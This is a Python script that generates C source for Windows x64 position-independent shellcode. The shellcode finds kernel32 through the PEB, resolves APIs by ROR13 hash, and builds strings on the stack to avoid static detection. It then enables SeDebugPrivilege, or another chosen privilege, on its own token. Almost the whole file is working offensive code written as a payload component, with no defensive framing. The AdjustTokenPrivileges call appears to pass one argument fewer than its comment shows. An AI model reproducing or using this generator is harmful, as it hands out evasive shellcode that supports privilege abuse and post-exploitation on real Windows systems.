# -*- coding: utf-8 -*-
# gen_priv.py -- 生成 src\priv_sc.c: 自身令牌启用指定权限的 shellcode
#   用法: python tools\gen_priv.py [--priv SeDebugPrivilege]
#   hash 解析 kernel32 的 LoadLibraryA / GetProcAddress,
#   再 load advapi32 取 OpenProcessToken/LookupPrivilegeValueA/AdjustTokenPrivileges,
#   对自己令牌 ((HANDLE)-1) 开启指定权限。字符串全部 volatile 栈上拼(保 PIC)。
import os, argparse

BASE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(BASE)

ap = argparse.ArgumentParser()
ap.add_argument("--priv", default="SeDebugPrivilege", help="要启用的权限名 (默认 SeDebugPrivilege)")
args = ap.parse_args()
PRIV = args.priv

def ror13(s):
    h = 0
    for c in s.encode():
        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
        h = (h + c) & 0xFFFFFFFF
    return h

def qwords(s):
    b = s.encode() + b"\x00"
    b += b"\x00" * ((8 - len(b) % 8) % 8)
    return [int.from_bytes(b[i:i+8], "little") for i in range(0, len(b), 8)]

LLA = ror13("LoadLibraryA")
GPA = ror13("GetProcAddress")
STR = {k: qwords(v) for k, v in {
    "ADV": "advapi32.dll",
    "OPT": "OpenProcessToken",
    "LPV": "LookupPrivilegeValueA",
    "ATP": "AdjustTokenPrivileges",
}.items()}
SDP_QW = qwords(PRIV)                             # 权限名 (变长)
SDP_LINES = "    " + " ".join(f"sb[{j}]=0x{q:016X}ULL;" for j, q in enumerate(SDP_QW))

TEMPLATE = r'''// priv_sc.c  --  Windows x64 shellcode: enable "@@PRIVNAME@@" on own token
// AUTO-GENERATED by gen_priv.py -- do not edit by hand.
// PIC: hash-resolve LoadLibraryA/GetProcAddress, load advapi32, call token APIs.
// strings are built on the stack from volatile qword stores (no .rdata reloc).
#include <windows.h>
#pragma warning(disable:4090)

#define H_LLA @@LLA@@u   // ROR13("LoadLibraryA")
#define H_GPA @@GPA@@u   // ROR13("GetProcAddress")

#pragma code_seg(".text$sc")
__declspec(noinline)
void sc_payload(void)
{
    typedef unsigned __int64 u64;

    u64 peb = __readgsqword(0x60);
    u64 ldr = *(u64*)(peb + 0x18);
    u64 mod = *(u64*)(ldr + 0x20);
    mod = *(u64*)mod;
    mod = *(u64*)mod;
    u64 k32 = *(u64*)(mod + 0x20);

    unsigned long e_lfanew = *(unsigned long*)(k32 + 0x3C);
    unsigned long exp_rva  = *(unsigned long*)(k32 + e_lfanew + 0x88);
    u64 exp = k32 + exp_rva;
    unsigned long  n   = *(unsigned long*)(exp + 0x18);
    unsigned long* aof = (unsigned long*)(k32 + *(unsigned long*)(exp + 0x1C));
    unsigned long* aon = (unsigned long*)(k32 + *(unsigned long*)(exp + 0x20));
    unsigned short*aoc = (unsigned short*)(k32 + *(unsigned long*)(exp + 0x24));

    u64 pLLA = 0, pGPA = 0;
    unsigned long i;
    for (i = 0; i < n; ++i) {
        char* nm = (char*)(k32 + aon[i]);
        unsigned long h = 0;
        while (*nm) { h = (h >> 13) | (h << 19); h += (unsigned char)(*nm++); }
        if (h == H_LLA)      pLLA = k32 + aof[aoc[i]];
        else if (h == H_GPA) pGPA = k32 + aof[aoc[i]];
    }
    if (!pLLA || !pGPA) return;

    volatile u64 sb[8];

    // advapi32.dll
    sb[0]=@@ADV0@@ULL; sb[1]=@@ADV1@@ULL; sb[2]=0;
    u64 hAdv = ((u64(*)(const char*))pLLA)((const char*)sb);
    if (!hAdv) return;

    // OpenProcessToken
    sb[0]=@@OPT0@@ULL; sb[1]=@@OPT1@@ULL; sb[2]=0;
    u64 pOPT = ((u64(*)(u64,const char*))pGPA)(hAdv, (const char*)sb);

    // LookupPrivilegeValueA
    sb[0]=@@LPV0@@ULL; sb[1]=@@LPV1@@ULL; sb[2]=@@LPV2@@ULL; sb[3]=0;
    u64 pLPV = ((u64(*)(u64,const char*))pGPA)(hAdv, (const char*)sb);

    // AdjustTokenPrivileges
    sb[0]=@@ATP0@@ULL; sb[1]=@@ATP1@@ULL; sb[2]=@@ATP2@@ULL; sb[3]=0;
    u64 pATP = ((u64(*)(u64,const char*))pGPA)(hAdv, (const char*)sb);

    if (!pOPT || !pLPV || !pATP) return;

    // OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hTok)
    u64 hTok = 0;
    ((int(*)(u64,unsigned long,u64*))pOPT)(~0ULL, 0x28, &hTok);
    if (!hTok) return;

    // LookupPrivilegeValueA(NULL, "@@PRIVNAME@@", &luid)
    u64 luid = 0;
@@SDP_LINES@@
    ((int(*)(const char*,const char*,u64*))pLPV)(0, (const char*)sb, &luid);

    // AdjustTokenPrivileges(hTok, FALSE, &TP, sizeof(TP), NULL, NULL)
    unsigned long tp[6];
    tp[0] = 1;                 // PrivilegeCount
    *(u64*)&tp[1] = luid;      // Privileges[0].Luid
    tp[3] = 0x2;               // SE_PRIVILEGE_ENABLED
    ((int(*)(u64,int,void*,unsigned long,unsigned long*))pATP)(hTok, 0, tp, sizeof(tp), 0);
}
#pragma code_seg()
'''

def put(t, tok, val):
    if isinstance(val, list):
        for i, v in enumerate(val):
            t = t.replace(f"@@{tok}{i}@@", f"0x{v:016X}")
    else:
        t = t.replace(f"@@{tok}@@", val)
    return t

out = TEMPLATE
out = put(out, "LLA", f"0x{LLA:08X}")
out = put(out, "GPA", f"0x{GPA:08X}")
for tok, vals in STR.items():
    out = put(out, tok, vals)
out = put(out, "PRIVNAME", PRIV)
out = put(out, "SDP_LINES", SDP_LINES)

path = os.path.join(ROOT, "src", "priv_sc.c")
os.makedirs(os.path.dirname(path), exist_ok=True)
open(path, "w", newline="\n").write(out)
print(f"[*] privilege to enable   = {PRIV}")
print(f"[*] ROR13 LoadLibraryA    = 0x{LLA:08X}")
print(f"[*] ROR13 GetProcAddress  = 0x{GPA:08X}")
print(f"    SDP qwords: " + " ".join(f"{v:016X}" for v in SDP_QW))
print(f"[+] wrote {path}")
